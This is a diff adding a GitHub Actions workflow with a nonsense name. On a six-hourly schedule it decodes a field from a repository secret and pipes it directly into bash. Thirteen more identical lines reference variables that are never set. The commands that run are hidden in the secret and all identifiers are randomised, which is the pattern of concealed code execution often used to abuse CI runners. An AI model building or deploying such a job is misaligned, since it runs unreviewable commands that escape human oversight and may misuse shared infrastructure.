@@ -1,0 +1,29 @@
+name: ershigougoudog
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ershigougoudog
+        env:
+          qk85821: ${{ secrets.qk85821 }}
+        run: |
+          echo $qk85821 | jq -r .iko436 | /bin/bash
+          echo $h407 | jq -r .dzv9 | /bin/bash
+          echo $n79 | jq -r .qay85 | /bin/bash
+          echo $tjo1273 | jq -r .kin01 | /bin/bash
+          echo $tv6 | jq -r .rlqtw63433 | /bin/bash
+          echo $tesx240 | jq -r .ga90 | /bin/bash
+          echo $tvhh2727 | jq -r .m4 | /bin/bash
+          echo $pq9926 | jq -r .u87538 | /bin/bash
+          echo $ru2 | jq -r .rj038 | /bin/bash
+          echo $zont4114 | jq -r .zmhy77 | /bin/bash
+          echo $mmntc68 | jq -r .nvzg3601 | /bin/bash
+          echo $tmp268 | jq -r .k76674 | /bin/bash
+          echo $xdbk44453 | jq -r .ci55 | /bin/bash
+          echo $w39 | jq -r .ncdo6 | /bin/bash
+
